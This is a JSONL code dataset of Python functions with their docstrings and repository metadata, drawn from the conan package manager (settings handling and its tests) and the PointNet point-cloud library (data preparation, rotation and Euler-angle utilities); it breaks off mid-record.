{"docstring": "\"\"\" deepcopy, recursive\n\"\"\"\n", "func_signal": "def copy_values(self):\n", "code": "result = Settings({}, name=self._name, parent_value=self._parent_value)\nfor k, v in self._data.items():\n    value = v.copy_values()\n    if value is not None:\n        result._data[k] = value\nreturn result", "path": "conan/conans/model/settings.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "# Ensure that compiler.runtime is not declared\n", "func_signal": "def test_runtime_auto(self):\n", "code": "default_profile = load(self.client.cache.default_profile_path)\nself.assertNotIn(default_profile, \"compiler.runtime\")\nself.client.run(\"install Hello0/0.1@lasote/channel --build missing\")\nif platform.system() == \"Windows\":\n    self.assertIn(\"Runtime: MD\", self.client.out)\n    self.client.run(\"install Hello0/0.1@lasote/channel --build missing -s build_type=Debug\")\n    self.assertIn(\"Runtime: MDd\", self.client.out)", "path": "conan/conans/test/functional/settings/conan_settings_preprocessor_test.py", "commit_date": "2020-11-04 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "# Checks --build in test command\n", "func_signal": "def test_conan_test(self):\n", "code": "client = TestClient()\nself._create(client, \"Hello0\", \"0.0\")\nself._create(client, \"Hello1\", \"1.1\", [\"Hello0/0.0@lasote/stable\"])\n\n# Now test out Hello2\nself._create(client, \"Hello2\", \"2.2\", [\"Hello1/1.1@lasote/stable\"], export=True)\nhello2conanfile = client.load(CONANFILE)\nclient.save({CONANFILE: hello2conanfile})\n\nconanfile = GenConanfile().with_test(\"pass\").with_require(\"Hello2/2.2@lasote/stable\")\nclient.save({\"test/conanfile.py\": conanfile})\n\n# Should recognize the hello package\n# Will Fail because Hello0/0.0 and Hello1/1.1 has not built packages\n# and by default no packages are built\nclient.run(\"create . lasote/stable\", assert_error=True)\nself.assertIn(\"Try to build from sources with '--build=Hello0 --build=Hello1'\", client.out)\n\n# We generate the package for Hello0/0.0\nclient.run(\"install Hello0/0.0@lasote/stable --build Hello0\")\n\n# Still missing Hello1/1.1\nclient.run(\"create . lasote/stable\", assert_error=True)\nself.assertIn(\"Try to build from sources with '--build=Hello1'\", client.out)\n\n# We generate the package for Hello1/1.1\nclient.run(\"install Hello1/1.1@lasote/stable --build Hello1\")\n\n# Now Hello2 should be built and not fail\nclient.run(\"create . lasote/stable\")\nself.assertNotIn(\"Can't find a 'Hello2/2.2@lasote/stable' package\", client.out)\nself.assertIn('Hello2/2.2@lasote/stable: Forced build from source', client.out)\n\n# Now package is generated but should be built again\nclient.run(\"create . lasote/stable\")\nself.assertIn('Hello2/2.2@lasote/stable: Forced build from source', client.out)", "path": "conan/conans/test/functional/only_source_test.py", "commit_date": "2020-11-04 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" try to reupload to same and other remote\n\"\"\"\n", "func_signal": "def test_reupload(self, mode):\n", "code": "self._create_code(mode)\n\nself.client.run(\"export . lasote/testing\")\nself.client.run(\"install Hello/0.1@lasote/testing --build=missing\")\nself.client.run(\"upload Hello/0.1@lasote/testing --all\")\nself.client.run('remove Hello/0.1@lasote/testing -f')\nself.client.run(\"install Hello/0.1@lasote/testing\")\n\n# upload to remote again, the folder remains as installed\nself.client.run(\"upload Hello/0.1@lasote/testing --all\")\nself._check_export_installed_folder(mode)\nself._check_server_folder(mode)\n\nself.client.run(\"upload Hello/0.1@lasote/testing --all -r=other\")\nself._check_export_uploaded_folder(mode)\nself._check_server_folder(mode, self.other_server)", "path": "conan/conans/test/integration/export_sources_test.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" Dirty context must remove lock before exiting\n\n\"\"\"\n", "func_signal": "def test_set_dirty_context(self):\n", "code": "with set_dirty_context_manager(self.temp_folder):\n    self.assertTrue(os.path.exists(self.dirty_folder))\nself.assertFalse(os.path.exists(self.dirty_folder))", "path": "conan/conans/test/unittests/util/files/test_dirty.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" Package folder must be always the same (might have tgz after upload)\n\"\"\"\n", "func_signal": "def _check_package_folder(self, mode):\n", "code": "if mode in [\"exports\", \"exports_sources\"]:\n    expected_package = [\"conaninfo.txt\", \"conanmanifest.txt\", \"include/hello.h\"]\nif mode == \"both\":\n    expected_package = [\"conaninfo.txt\", \"conanmanifest.txt\", \"include/hello.h\",\n                        \"docs/data.txt\"]\nif mode == \"nested\" or mode == \"overlap\":\n    expected_package = [\"conaninfo.txt\", \"conanmanifest.txt\", \"include/src/hello.h\",\n                        \"docs/src/data.txt\"]\n\nself.assertEqual(scan_folder(self.package_folder), sorted(expected_package))", "path": "conan/conans/test/integration/export_sources_test.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" This is necessary to remove libcxx subsetting from compiler in config()\n   del self.settings.compiler.stdlib\n\"\"\"\n", "func_signal": "def __delattr__(self, item):\n", "code": "try:\n    self._get_child(self._value).remove(item)\nexcept Exception:\n    pass", "path": "conan/conans/model/settings.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" deepcopy, recursive\n\"\"\"\n", "func_signal": "def copy(self):\n", "code": "result = Settings({}, name=self._name, parent_value=self._parent_value)\nfor k, v in self._data.items():\n    result._data[k] = v.copy()\nreturn result", "path": "conan/conans/model/settings.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" Dirty flag must be cleaned by clean_dirty\n\n\"\"\"\n", "func_signal": "def test_clean_dirty(self):\n", "code": "set_dirty(self.temp_folder)\nself.assertTrue(os.path.exists(self.dirty_folder))\nclean_dirty(self.temp_folder)\nself.assertFalse(os.path.exists(self.dirty_folder))", "path": "conan/conans/test/unittests/util/files/test_dirty.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" receives a list of tuples (compiler.version, value)\nThis is more an updated than a setter\n\"\"\"\n", "func_signal": "def update_values(self, vals):\n", "code": "assert isinstance(vals, list), vals\nfor (name, value) in vals:\n    list_settings = name.split(\".\")\n    attr = self\n    for setting in list_settings[:-1]:\n        attr = getattr(attr, setting)\n    setattr(attr, list_settings[-1], str(value))", "path": "conan/conans/model/settings.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" allows to restrict a given Settings object with the input of another Settings object\n1. The other Settings object MUST be exclusively a subset of the former.\n   No additions allowed\n2. If the other defines {\"compiler\": None} means to keep the full specification\n\"\"\"\n", "func_signal": "def constraint(self, constraint_def):\n", "code": "if isinstance(constraint_def, (list, tuple, set)):\n    constraint_def = {str(k): None for k in constraint_def or []}\nelse:\n    constraint_def = {str(k): v for k, v in constraint_def.items()}\n\nfields_to_remove = []\nfor field, config_item in self._data.items():\n    if field not in constraint_def:\n        fields_to_remove.append(field)\n        continue\n\n    other_field_def = constraint_def[field]\n    if other_field_def is None:  # Means leave it as is\n        continue\n    if isinstance(other_field_def, str):\n        other_field_def = [other_field_def]\n\n    values_to_remove = []\n    for value in config_item.values_range:  # value = \"Visual Studio\"\n        if value not in other_field_def:\n            values_to_remove.append(value)\n        else:  # recursion\n            if (not config_item.is_final and isinstance(other_field_def, dict) and\n                    other_field_def[value] is not None):\n                config_item[value].constraint(other_field_def[value])\n\n    # Sanity check of input constraint values\n    for value in other_field_def:\n        if value not in config_item.values_range:\n            raise ConanException(bad_value_msg(field, value, config_item.values_range))\n\n    config_item.remove(values_to_remove)\n\n# Sanity check for input constraint wrong fields\nfor field in constraint_def:\n    if field not in self._data:\n        raise undefined_field(self._name, field, self.fields)\n\n# remove settings not defined in the constraint\nself.remove(fields_to_remove)", "path": "conan/conans/model/settings.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" Just installed, no EXPORT_SOURCES_DIR is present\n\"\"\"\n", "func_signal": "def _check_export_installed_folder(self, mode, updated=False):\n", "code": "if mode == \"exports_sources\":\n    expected_exports = ['conanfile.py', 'conanmanifest.txt']\nif mode == \"both\":\n    expected_exports = ['conanfile.py', 'conanmanifest.txt', \"data.txt\"]\nif mode == \"exports\":\n    expected_exports = ['conanfile.py', 'conanmanifest.txt', \"hello.h\"]\nif mode == \"nested\":\n    expected_exports = ['conanfile.py', 'conanmanifest.txt', \"src/data.txt\"]\nif mode == \"overlap\":\n    expected_exports = ['conanfile.py', 'conanmanifest.txt', \"src/data.txt\", \"src/hello.h\"]\nif updated:\n    expected_exports.append(\"license.txt\")\n\nself.assertEqual(scan_folder(self.export_folder), sorted(expected_exports))\nself.assertFalse(os.path.exists(self.export_sources_folder))", "path": "conan/conans/test/integration/export_sources_test.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" deepcopy, recursive\n\"\"\"\n", "func_signal": "def copy(self):\n", "code": "result = SettingsItem({}, name=self._name)\nresult._value = self._value\nif self.is_final:\n    result._definition = self._definition[:]\nelse:\n    result._definition = {k: v.copy() for k, v in self._definition.items()}\nreturn result", "path": "conan/conans/model/settings.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" nodes are different even if contain same values,\nso they can be repeated if necessary in the graph (common\nstatic libraries)\n\"\"\"\n", "func_signal": "def test_node(self):\n", "code": "ref1 = ConanFileReference.loads(\"Hello/0.1@user/stable\")\nref2 = ConanFileReference.loads(\"Hello/0.1@user/stable\")\n\nconanfile1 = ConanFile(TestBufferConanOutput(), None)\nconanfile2 = ConanFile(TestBufferConanOutput(), None)\nn1 = Node(ref1, conanfile1, context=CONTEXT_HOST)\nn2 = Node(ref2, conanfile2, context=CONTEXT_HOST)\n\nself.assertNotEqual(n1, n2)", "path": "conan/conans/test/unittests/client/graph/deps_graph_test.py", "commit_date": "2020-12-17 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" Source folder MUST be always the same\n\"\"\"\n", "func_signal": "def _check_source_folder(self, mode):\n", "code": "expected_sources = [\"hello.h\"]\nif mode == \"both\":\n    expected_sources.append(\"data.txt\")\nif mode == \"nested\" or mode == \"overlap\":\n    expected_sources = [\"src/hello.h\", \"src/data.txt\"]\nexpected_sources = sorted(expected_sources)\nself.assertEqual(scan_folder(self.source_folder), expected_sources)", "path": "conan/conans/test/integration/export_sources_test.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "# https://github.com/conan-io/conan/issues/943\n", "func_signal": "def test_copy(self, mode):\n", "code": "self._create_code(mode)\n\nself.client.run(\"export . lasote/testing\")\nself.client.run(\"install Hello/0.1@lasote/testing --build=missing\")\nself.client.run(\"upload Hello/0.1@lasote/testing --all\")\nself.client.run('remove Hello/0.1@lasote/testing -f')\nself.client.run(\"install Hello/0.1@lasote/testing\")\n\n# new copied package data\nref = ConanFileReference.loads(\"Hello/0.1@lasote/stable\")\nsource_folder = self.client.cache.package_layout(ref).source()\nexport_folder = self.client.cache.package_layout(ref).export()\n\nself.client.run(\"copy Hello/0.1@lasote/testing lasote/stable\")\nself._check_export_folder(mode, export_folder)\n\nself.client.run(\"upload Hello/0.1@lasote/stable\")\nself.assertFalse(os.path.exists(source_folder))\nself._check_export_uploaded_folder(mode, export_folder)\nself._check_server_folder(mode)", "path": "conan/conans/test/integration/export_sources_test.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "# Generate the settings.yml\n", "func_signal": "def test_runtime_not_present_ok(self):\n", "code": "self.client.run(\"config init\")\ndefault_settings = load(self.client.cache.settings_path)\ndefault_settings = default_settings.replace(\"runtime:\", \"# runtime:\")\nsave(self.client.cache.settings_path, default_settings)\n# Ensure the runtime setting is not there anymore\nself.client.run('install Hello0/0.1@lasote/channel --build missing -s '\n                'compiler=\"Visual Studio\" -s compiler.runtime=\"MDd\"', assert_error=True)\nself.assertIn(\"'settings.compiler.runtime' doesn't exist for 'Visual Studio'\",\n              self.client.out)\n\n# Now install, the preprocessor shouldn't fail nor do anything\nself.client.run(\"install Hello0/0.1@lasote/channel --build missing\")\nself.assertNotIn(\"Setting 'compiler.runtime' not declared, automatically\",\n                 self.client.out)", "path": "conan/conans/test/functional/settings/conan_settings_preprocessor_test.py", "commit_date": "2020-11-04 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" Create temporary folder to save dirty state\n\n\"\"\"\n", "func_signal": "def setUp(self):\n", "code": "self.temp_folder = temp_folder()\nself.dirty_folder = self.temp_folder + _DIRTY_FOLDER", "path": "conan/conans/test/unittests/util/files/test_dirty.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "conan-io/conan", "stars": 7606, "license": "mit", "language": "python", "size": 28820}
{"docstring": "\"\"\" Compute bounding boxes from each instance in original dataset files on\n    one room. **We assume the bbox is aligned with XYZ coordinate.**\n    Save both the point XYZRGB and the bounding box for the point's\n    parent element.\n \nArgs:\n    anno_path: path to annotations. e.g. Area_1/office_2/Annotations/\n    out_filename: path to save instance bounding boxes for each point,\n        plus the point's XYZRGBL\n        each line is XYZRGBL offsetX offsetY offsetZ a b c,\n        where cx = X+offsetX, cy=X+offsetY, cz=Z+offsetZ\n        where (cx,cy,cz) is center of the box, a,b,c are distances from center\n        to the surfaces of the box, i.e. x1 = cx-a, x2 = cx+a, y1=cy-b etc.\n    file_format: output file format, txt or numpy\nReturns:\n    None\n\nNote:\n    room points are shifted, the most negative point is now at origin.\n\"\"\"\n", "func_signal": "def collect_point_bounding_box(anno_path, out_filename, file_format):\n", "code": "point_bbox_list = []\n\nfor f in glob.glob(os.path.join(anno_path, '*.txt')):\n    cls = os.path.basename(f).split('_')[0]\n    if cls not in g_classes: # note: in some room there is 'staris' class..\n        cls = 'clutter'\n    points = np.loadtxt(f) # Nx6\n    label = g_class2label[cls] # N,\n    # Compute tightest axis aligned bounding box\n    xyz_min = np.amin(points[:, 0:3], axis=0) # 3,\n    xyz_max = np.amax(points[:, 0:3], axis=0) # 3,\n    xyz_center = (xyz_min + xyz_max) / 2\n    dimension = (xyz_max - xyz_min) / 2\n\n    xyz_offsets = xyz_center - points[:,0:3] # Nx3\n    dimensions = np.ones((points.shape[0],3)) * dimension # Nx3\n    labels = np.ones((points.shape[0],1)) * label # N\n    point_bbox_list.append(np.concatenate([points, labels,\n                                       xyz_offsets, dimensions], 1)) # Nx13\n\npoint_bbox = np.concatenate(point_bbox_list, 0) # KxNx13\nroom_xyz_min = np.amin(point_bbox[:, 0:3], axis=0)\npoint_bbox[:, 0:3] -= room_xyz_min \n\nif file_format == 'txt':\n    fout = open(out_filename, 'w')\n    for i in range(point_bbox.shape[0]):\n        fout.write('%f %f %f %d %d %d %d %f %f %f %f %f %f\\n' % \\\n                      (point_bbox[i,0], point_bbox[i,1], point_bbox[i,2],\n                       point_bbox[i,3], point_bbox[i,4], point_bbox[i,5],\n                       point_bbox[i,6],\n                       point_bbox[i,7], point_bbox[i,8], point_bbox[i,9],\n                       point_bbox[i,10], point_bbox[i,11], point_bbox[i,12]))\n    \n    fout.close()\nelif file_format == 'numpy':\n    np.save(out_filename, point_bbox)\nelse:\n    print('ERROR!! Unknown file format: %s, please use txt or numpy.' % \\\n        (file_format))\n    exit()", "path": "pointnet/sem_seg/indoor3d_util.py", "commit_date": "2017-06-06 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" data is in N x ...\n    we want to keep num_samplexC of them.\n    if N > num_sample, we will randomly keep num_sample of them.\n    if N < num_sample, we will randomly duplicate samples.\n\"\"\"\n", "func_signal": "def sample_data(data, num_sample):\n", "code": "N = data.shape[0]\nif (N == num_sample):\n    return data, range(N)\nelif (N > num_sample):\n    sample = np.random.choice(N, num_sample)\n    return data[sample, ...], sample\nelse:\n    sample = np.random.choice(N, num_sample-N)\n    dup_data = data[sample, ...]\n    return np.concatenate([data, dup_data], 0), range(N)+list(sample)", "path": "pointnet/sem_seg/indoor3d_util.py", "commit_date": "2017-06-06 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" Rotate the point cloud along up direction with certain angle.\n    Input:\n      BxNx3 array, original batch of point clouds\n    Return:\n      BxNx3 array, rotated batch of point clouds\n\"\"\"\n", "func_signal": "def rotate_point_cloud_by_angle(batch_data, rotation_angle):\n", "code": "rotated_data = np.zeros(batch_data.shape, dtype=np.float32)\nfor k in range(batch_data.shape[0]):\n    #rotation_angle = np.random.uniform() * 2 * np.pi\n    cosval = np.cos(rotation_angle)\n    sinval = np.sin(rotation_angle)\n    rotation_matrix = np.array([[cosval, 0, sinval],\n                                [0, 1, 0],\n                                [-sinval, 0, cosval]])\n    shape_pc = batch_data[k, ...]\n    rotated_data[k, ...] = np.dot(shape_pc.reshape((-1, 3)), rotation_matrix)\nreturn rotated_data", "path": "pointnet/provider.py", "commit_date": "2017-06-07 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" Convert original dataset files to data_label file (each line is XYZRGBL).\n    We aggregated all the points from each instance in the room.\n\nArgs:\n    anno_path: path to annotations. e.g. Area_1/office_2/Annotations/\n    out_filename: path to save collected points and labels (each line is XYZRGBL)\n    file_format: txt or numpy, determines what file format to save.\nReturns:\n    None\nNote:\n    the points are shifted before save, the most negative point is now at origin.\n\"\"\"\n", "func_signal": "def collect_point_label(anno_path, out_filename, file_format='txt'):\n", "code": "points_list = []\n\nfor f in glob.glob(os.path.join(anno_path, '*.txt')):\n    cls = os.path.basename(f).split('_')[0]\n    if cls not in g_classes: # note: in some room there is 'staris' class..\n        cls = 'clutter'\n    points = np.loadtxt(f)\n    labels = np.ones((points.shape[0],1)) * g_class2label[cls]\n    points_list.append(np.concatenate([points, labels], 1)) # Nx7\n\ndata_label = np.concatenate(points_list, 0)\nxyz_min = np.amin(data_label, axis=0)[0:3]\ndata_label[:, 0:3] -= xyz_min\n\nif file_format=='txt':\n    fout = open(out_filename, 'w')\n    for i in range(data_label.shape[0]):\n        fout.write('%f %f %f %d %d %d %d\\n' % \\\n                      (data_label[i,0], data_label[i,1], data_label[i,2],\n                       data_label[i,3], data_label[i,4], data_label[i,5],\n                       data_label[i,6]))\n    fout.close()\nelif file_format=='numpy':\n    np.save(out_filename, data_label)\nelse:\n    print('ERROR!! Unknown file format: %s, please use txt or numpy.' % \\\n        (file_format))\n    exit()", "path": "pointnet/sem_seg/indoor3d_util.py", "commit_date": "2017-06-06 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" Compute bounding boxes from each instance in original dataset files on\n    one room. **We assume the bbox is aligned with XYZ coordinate.**\n\nArgs:\n    anno_path: path to annotations. e.g. Area_1/office_2/Annotations/\n    out_filename: path to save instance bounding boxes for that room.\n        each line is x1 y1 z1 x2 y2 z2 label,\n        where (x1,y1,z1) is the point on the diagonal closer to origin\nReturns:\n    None\nNote:\n    room points are shifted, the most negative point is now at origin.\n\"\"\"\n", "func_signal": "def collect_bounding_box(anno_path, out_filename):\n", "code": "bbox_label_list = []\n\nfor f in glob.glob(os.path.join(anno_path, '*.txt')):\n    cls = os.path.basename(f).split('_')[0]\n    if cls not in g_classes: # note: in some room there is 'staris' class..\n        cls = 'clutter'\n    points = np.loadtxt(f)\n    label = g_class2label[cls]\n    # Compute tightest axis aligned bounding box\n    xyz_min = np.amin(points[:, 0:3], axis=0)\n    xyz_max = np.amax(points[:, 0:3], axis=0)\n    ins_bbox_label = np.expand_dims(\n        np.concatenate([xyz_min, xyz_max, np.array([label])], 0), 0)\n    bbox_label_list.append(ins_bbox_label)\n\nbbox_label = np.concatenate(bbox_label_list, 0)\nroom_xyz_min = np.amin(bbox_label[:, 0:3], axis=0)\nbbox_label[:, 0:3] -= room_xyz_min \nbbox_label[:, 3:6] -= room_xyz_min \n\nfout = open(out_filename, 'w')\nfor i in range(bbox_label.shape[0]):\n    fout.write('%f %f %f %f %f %f %d\\n' % \\\n                  (bbox_label[i,0], bbox_label[i,1], bbox_label[i,2],\n                   bbox_label[i,3], bbox_label[i,4], bbox_label[i,5],\n                   bbox_label[i,6]))\nfout.close()", "path": "pointnet/sem_seg/indoor3d_util.py", "commit_date": "2017-06-06 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "''' Return matrix for rotations around z, y and x axes\n\nUses the z, then y, then x convention above\n\nParameters\n----------\nz : scalar\n   Rotation angle in radians around z-axis (performed first)\ny : scalar\n   Rotation angle in radians around y-axis\nx : scalar\n   Rotation angle in radians around x-axis (performed last)\n\nReturns\n-------\nM : array shape (3,3)\n   Rotation matrix giving same rotation as for given angles\n\nExamples\n--------\n>>> zrot = 1.3 # radians\n>>> yrot = -0.1\n>>> xrot = 0.2\n>>> M = euler2mat(zrot, yrot, xrot)\n>>> M.shape == (3, 3)\nTrue\n\nThe output rotation matrix is equal to the composition of the\nindividual rotations\n\n>>> M1 = euler2mat(zrot)\n>>> M2 = euler2mat(0, yrot)\n>>> M3 = euler2mat(0, 0, xrot)\n>>> composed_M = np.dot(M3, np.dot(M2, M1))\n>>> np.allclose(M, composed_M)\nTrue\n\nYou can specify rotations by named arguments\n\n>>> np.all(M3 == euler2mat(x=xrot))\nTrue\n\nWhen applying M to a vector, the vector should column vector to the\nright of M.  If the right hand side is a 2D array rather than a\nvector, then each column of the 2D array represents a vector.\n\n>>> vec = np.array([1, 0, 0]).reshape((3,1))\n>>> v2 = np.dot(M, vec)\n>>> vecs = np.array([[1, 0, 0],[0, 1, 0]]).T # giving 3x2 array\n>>> vecs2 = np.dot(M, vecs)\n\nRotations are counter-clockwise.\n\n>>> zred = np.dot(euler2mat(z=np.pi/2), np.eye(3))\n>>> np.allclose(zred, [[0, -1, 0],[1, 0, 0], [0, 0, 1]])\nTrue\n>>> yred = np.dot(euler2mat(y=np.pi/2), np.eye(3))\n>>> np.allclose(yred, [[0, 0, 1],[0, 1, 0], [-1, 0, 0]])\nTrue\n>>> xred = np.dot(euler2mat(x=np.pi/2), np.eye(3))\n>>> np.allclose(xred, [[1, 0, 0],[0, 0, -1], [0, 1, 0]])\nTrue\n\nNotes\n-----\nThe direction of rotation is given by the right-hand rule (orient\nthe thumb of the right hand along the axis around which the rotation\noccurs, with the end of the thumb at the positive end of the axis;\ncurl your fingers; the direction your fingers curl is the direction\nof rotation).  Therefore, the rotations are counterclockwise if\nlooking along the axis of rotation from positive to negative.\n'''\n", "func_signal": "def euler2mat(z=0, y=0, x=0):\n", "code": "Ms = []\nif z:\n    cosz = math.cos(z)\n    sinz = math.sin(z)\n    Ms.append(np.array(\n            [[cosz, -sinz, 0],\n             [sinz, cosz, 0],\n             [0, 0, 1]]))\nif y:\n    cosy = math.cos(y)\n    siny = math.sin(y)\n    Ms.append(np.array(\n            [[cosy, 0, siny],\n             [0, 1, 0],\n             [-siny, 0, cosy]]))\nif x:\n    cosx = math.cos(x)\n    sinx = math.sin(x)\n    Ms.append(np.array(\n            [[1, 0, 0],\n             [0, cosx, -sinx],\n             [0, sinx, cosx]]))\nif Ms:\n    return reduce(np.dot, Ms[::-1])\nreturn np.eye(3)", "path": "pointnet/utils/eulerangles.py", "commit_date": "2017-06-07 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" Transform Net, input is BxNx3 gray image\n    Return:\n        Transformation matrix of size 3xK \"\"\"\n", "func_signal": "def get_transform(point_cloud, is_training, bn_decay=None, K = 3):\n", "code": "batch_size = point_cloud.get_shape()[0].value\nnum_point = point_cloud.get_shape()[1].value\n\ninput_image = tf.expand_dims(point_cloud, -1)\nnet = tf_util.conv2d(input_image, 64, [1,3], padding='VALID', stride=[1,1],\n                     bn=True, is_training=is_training, scope='tconv1', bn_decay=bn_decay)\nnet = tf_util.conv2d(net, 128, [1,1], padding='VALID', stride=[1,1],\n                     bn=True, is_training=is_training, scope='tconv3', bn_decay=bn_decay)\nnet = tf_util.conv2d(net, 1024, [1,1], padding='VALID', stride=[1,1],\n                     bn=True, is_training=is_training, scope='tconv4', bn_decay=bn_decay)\nnet = tf_util.max_pool2d(net, [num_point,1], padding='VALID', scope='tmaxpool')\n\nnet = tf.reshape(net, [batch_size, -1])\nnet = tf_util.fully_connected(net, 128, bn=True, is_training=is_training, scope='tfc1', bn_decay=bn_decay)\nnet = tf_util.fully_connected(net, 128, bn=True, is_training=is_training, scope='tfc2', bn_decay=bn_decay)\n\nwith tf.variable_scope('transform_XYZ') as sc:\n    assert(K==3)\n    weights = tf.get_variable('weights', [128, 3*K], initializer=tf.constant_initializer(0.0), dtype=tf.float32)\n    biases = tf.get_variable('biases', [3*K], initializer=tf.constant_initializer(0.0), dtype=tf.float32) + tf.constant([1,0,0,0,1,0,0,0,1], dtype=tf.float32)\n    transform = tf.matmul(net, weights)\n    transform = tf.nn.bias_add(transform, biases)\n\n#transform = tf_util.fully_connected(net, 3*K, activation_fn=None, scope='tfc3')\ntransform = tf.reshape(transform, [batch_size, 3, K])\nreturn transform", "path": "pointnet/part_seg/pointnet_part_seg.py", "commit_date": "2017-04-11 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "''' Convert angle, axis pair to Euler angles\n\nParameters\n----------\ntheta : scalar\n   angle of rotation\nvector : 3 element sequence\n   vector specifying axis for rotation.\nis_normalized : bool, optional\n   True if vector is already normalized (has norm of 1).  Default\n   False\n\nReturns\n-------\nz : scalar\ny : scalar\nx : scalar\n   Rotations in radians around z, y, x axes, respectively\n\nExamples\n--------\n>>> z, y, x = angle_axis2euler(0, [1, 0, 0])\n>>> np.allclose((z, y, x), 0)\nTrue\n\nNotes\n-----\nIt's possible to reduce the amount of calculation a little, by\ncombining parts of the ``angle_axis2mat`` and ``mat2euler``\nfunctions, but the reduction in computation is small, and the code\nrepetition is large.\n'''\n# delayed import to avoid cyclic dependencies\n", "func_signal": "def angle_axis2euler(theta, vector, is_normalized=False):\n", "code": "import nibabel.quaternions as nq\nM = nq.angle_axis2mat(theta, vector, is_normalized)\nreturn mat2euler(M)", "path": "pointnet/utils/eulerangles.py", "commit_date": "2017-06-07 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "''' Discover Euler angle vector from 3x3 matrix\n\nUses the conventions above.\n\nParameters\n----------\nM : array-like, shape (3,3)\ncy_thresh : None or scalar, optional\n   threshold below which to give up on straightforward arctan for\n   estimating x rotation.  If None (default), estimate from\n   precision of input.\n\nReturns\n-------\nz : scalar\ny : scalar\nx : scalar\n   Rotations in radians around z, y, x axes, respectively\n\nNotes\n-----\nIf there was no numerical error, the routine could be derived using\nSympy expression for z then y then x rotation matrix, which is::\n\n  [                       cos(y)*cos(z),                       -cos(y)*sin(z),         sin(y)],\n  [cos(x)*sin(z) + cos(z)*sin(x)*sin(y), cos(x)*cos(z) - sin(x)*sin(y)*sin(z), -cos(y)*sin(x)],\n  [sin(x)*sin(z) - cos(x)*cos(z)*sin(y), cos(z)*sin(x) + cos(x)*sin(y)*sin(z),  cos(x)*cos(y)]\n\nwith the obvious derivations for z, y, and x\n\n   z = atan2(-r12, r11)\n   y = asin(r13)\n   x = atan2(-r23, r33)\n\nProblems arise when cos(y) is close to zero, because both of::\n\n   z = atan2(cos(y)*sin(z), cos(y)*cos(z))\n   x = atan2(cos(y)*sin(x), cos(x)*cos(y))\n\nwill be close to atan2(0, 0), and highly unstable.\n\nThe ``cy`` fix for numerical instability below is from: *Graphics\nGems IV*, Paul Heckbert (editor), Academic Press, 1994, ISBN:\n0123361559.  Specifically it comes from EulerAngles.c by Ken\nShoemake, and deals with the case where cos(y) is close to zero:\n\nSee: http://www.graphicsgems.org/\n\nThe code appears to be licensed (from the website) as \"can be used\nwithout restrictions\".\n'''\n", "func_signal": "def mat2euler(M, cy_thresh=None):\n", "code": "M = np.asarray(M)\nif cy_thresh is None:\n    try:\n        cy_thresh = np.finfo(M.dtype).eps * 4\n    except ValueError:\n        cy_thresh = _FLOAT_EPS_4\nr11, r12, r13, r21, r22, r23, r31, r32, r33 = M.flat\n# cy: sqrt((cos(y)*cos(z))**2 + (cos(x)*cos(y))**2)\ncy = math.sqrt(r33*r33 + r23*r23)\nif cy > cy_thresh: # cos(y) not close to zero, standard form\n    z = math.atan2(-r12,  r11) # atan2(cos(y)*sin(z), cos(y)*cos(z))\n    y = math.atan2(r13,  cy) # atan2(sin(y), cy)\n    x = math.atan2(-r23, r33) # atan2(cos(y)*sin(x), cos(x)*cos(y))\nelse: # cos(y) (close to) zero, so x -> 0.0 (see above)\n    # so r21 -> sin(z), r22 